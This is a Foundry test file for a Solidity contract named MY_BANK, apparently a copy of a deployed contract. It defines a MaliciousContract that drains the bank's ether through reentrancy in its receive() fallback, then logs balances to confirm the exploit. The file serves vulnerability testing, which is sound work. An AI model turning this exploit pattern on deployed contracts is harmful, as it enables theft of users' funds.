// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol";

contract MockLog {
    function AddMessage(address _adr, uint _val, string memory _data) public {}
}

contract MaliciousContract {
    MY_BANK public bank;
    uint public attackCount;
    uint public attackAmount;

    constructor(MY_BANK _bank) {
        bank = _bank;
    }

    function deposit(uint _unlockTime) external payable {
        bank.Put{value: msg.value}(_unlockTime);
    }

    function attack(uint _amount) external {
        attackAmount = _amount;
        bank.Collect(_amount);
    }

    receive() external payable {
        if (attackCount < 2 && address(bank).balance >= attackAmount) {
            attackCount++;
            bank.Collect(attackAmount);
        }
    }
}

contract MY_BANKTest is Test {
    MY_BANK public bank;
    MaliciousContract public attacker;
    MockLog public mockLog;
    uint public constant MIN_SUM = 1 ether;

    function setUp() public {
        mockLog = new MockLog();
        bank = new MY_BANK(address(mockLog));
        attacker = new MaliciousContract(bank);
        
        // Set MinSum if needed (assuming it's a public variable)
        vm.store(address(bank), bytes32(uint256(0)), bytes32(MIN_SUM));
    }

    function testReentrancyAttack() public {
        uint depositAmount = 2 ether;
        uint unlockTime = block.timestamp + 1 days;

        // Attacker deposits funds
        vm.deal(address(attacker), depositAmount);
        vm.prank(address(attacker));
        attacker.deposit{value: depositAmount}(unlockTime);

        // Fast forward time to pass unlockTime
        vm.warp(unlockTime + 1);

        // PRE-ATTACK STATE LOGGING
        console.log("--- BEFORE-Trigger Balance ---");
        uint bankBalanceBefore = address(bank).balance;
        uint attackerBalanceBefore = address(attacker).balance;
        (, uint attackerAccBalanceBefore) = bank.Acc(address(attacker));
        console.log("Bank ETH balance before attack:", bankBalanceBefore);
        console.log("Attacker ETH balance before attack:", attackerBalanceBefore);
        console.log("Attacker account balance in MY_BANK before attack:", attackerAccBalanceBefore);
        
        console.log("--- Trigger Attack ---");
        uint attackAmount = 1 ether;
        attacker.attack(attackAmount);
        
        // POST-ATTACK STATE LOGGING
        console.log("--- AFTER-Trigger Balance ---");
        uint bankBalanceAfter = address(bank).balance;
        uint attackerBalanceAfter = address(attacker).balance;
        (, uint attackerAccBalanceAfter) = bank.Acc(address(attacker));
        console.log("Bank ETH balance after attack:", bankBalanceAfter);
        console.log("Attacker ETH balance after attack:", attackerBalanceAfter);
        console.log("Attacker account balance in MY_BANK after attack:", attackerAccBalanceAfter);
        
        // STATE COMPARISON
        console.log("--- Test Result ---");
        bool exploitSuccess = (bankBalanceAfter == 0 && 
                               attackerBalanceAfter == 2 ether &&
                               attackerAccBalanceAfter == 0);
        
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained bank funds");
        } else {
            console.log("Vulnerability not Exist: State changes do not indicate successful reentrancy attack");
        }
    }
}